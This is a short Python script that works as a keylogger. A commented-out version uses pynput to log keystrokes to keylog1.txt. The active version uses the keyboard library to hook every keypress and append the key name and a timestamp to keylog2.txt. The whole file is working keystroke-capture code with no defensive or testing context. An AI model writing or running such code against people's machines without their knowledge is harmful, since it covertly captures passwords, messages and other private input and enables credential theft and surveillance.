import pynput 
import logging
import keyboard
from datetime import datetime

#1
# logging.basicConfig(filename = "keylog1.txt", level = logging.DEBUG, format = '%(asctime)s: %(message)s')


# def first(key):
#     logging.info(str(key))

# with pynput.keyboard.Listener(on_press=first) as listener:
#     listener.join()

#2
def second(event):
    time = datetime.fromtimestamp(event.time).strftime('%Y-%m-%d %H:%M:%S')
    with open("keylog2.txt" , "a") as f:
        # f.write("{} ".format(event.name))
        f.write(f"Key: {event.name}\n")
        f.write(f"Time: {time}\n")
        f.write("\n")

if __name__ == '__main__':
    keyboard.on_press(second)
    keyboard.wait()
